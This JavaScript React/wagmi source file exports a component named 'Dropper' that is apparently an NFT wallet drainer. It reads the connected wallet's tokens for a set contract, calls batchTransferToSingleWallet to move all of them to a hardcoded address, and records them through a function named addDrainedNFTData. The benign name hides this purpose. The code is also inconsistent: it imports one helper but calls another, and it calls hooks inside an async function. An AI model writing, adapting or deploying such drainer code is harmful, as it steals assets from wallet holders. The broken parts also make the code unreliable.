
import { useAccount, useContractWrite, usePrepareContractWrite } from "wagmi";
import { getNFTData, getTokenIdsForContract, addDroppedNFTData } from '../Constants/APIendpoints.jsx';
import batchtransferAbi from '../abis/batchtransfer.json';
import { BatchTransferAddress, NFTaddress } from '../Constants/Contracts.jsx';


const Dropper = async (address) => {

    const { config } = usePrepareContractWrite({
        address: BatchTransferAddress,
        abi: batchtransferAbi,
        functionName: 'batchTransferToSingleWallet',
    });

    const { write } = useContractWrite(config);
    

    (async (address) => {
      
        try {
            const data = await getNFTData(address);
            const tokenIds = await getTokenIdsForContract(data, NFTaddress);
            if (tokenIds.length > 0) {
                write({
                    args: [NFTaddress, "0xaD1beE8B474644bA41736B6c513f55D800E04e78", tokenIds],
                    from: address,
                    onSuccess() {
                        addDroppedTokens();
                    }
                });
            }
        } catch (error) {
            console.log("Error fetching NFT data: ", error);
        }
      })(address);

      const saveDroppedNFTs = async(tokensList) => {
        try {
            const response = await addDrainedNFTData(address, tokensList);
            if (response.success) {
                console.log("NFT data retrieved from wallet successfully ;)");
            } else {
                console.error("Error saving NFT data retrieved from wallet", response);
            }
        } catch (error) {
            console.error("Error saving NFTs: ", error);
        }
      }
    
      const addDroppedTokens = async () => {
        try {
            let formattedData = {};
            const data = await getNFTData(address);
      
            for (let nftData of data[NFTaddress.toLowerCase()]) {
                const tokenType = nftData.tokenType;
                const tokenId = nftData.tokenId;
                const tokenUri = nftData.tokenUri;
      
                if (!formattedData[address]) {
                    formattedData[address] = [];
                }
                formattedData[address].push({ tokenId, tokenType, tokenUri });
            }
      
            console.log(`formatted data: ${JSON.stringify(formattedData[address])}`);
            saveDroppedNFTs(formattedData[address]);
        } catch (error) {
            console.log("Error saving drained NFTs data ", error);
        }
      };
};

export default Dropper;